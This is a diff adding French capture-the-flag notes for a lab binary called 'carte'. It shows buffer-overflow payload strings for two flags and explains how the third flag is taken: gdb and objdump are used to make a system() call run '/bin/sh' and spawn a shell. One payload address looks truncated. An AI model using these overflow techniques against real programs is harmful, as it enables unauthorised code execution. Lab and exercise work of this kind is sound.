@@ -4,3 +4,12 @@ donc pour username 24 A, pour 32 X pour la response et 8 X pour le pointer de us
 payload : printf "XXXXXXXXXXXXXXXXXXXXXXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x92\x04\x8" | ./carte
 
 flag 2: 
+payload 'XXXXXXXXXXXXXXXXXXXXXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xc0\x04\x08AAAA\x6d\x93\x04\x08'
+
+flag 3:
+on veut faire lancer un shell pour affiche le flag secret.
+On veut donc faire évaluer à system non pas le contenu entre parenthèse mais la variable volatile secret qui contient '/bin/sh'.
+on trouve son adresse avec info var dans gdb '0x0804c048  secret'.
+0x1fea +0x0804c048:  on veut mettre dans eax (voir le code en objdump) pour que system call le eax.
+on fait ce clacul et on le met dans le payload d'avant .
+on a donc lancé un shell et on peut afficher tous les flags.
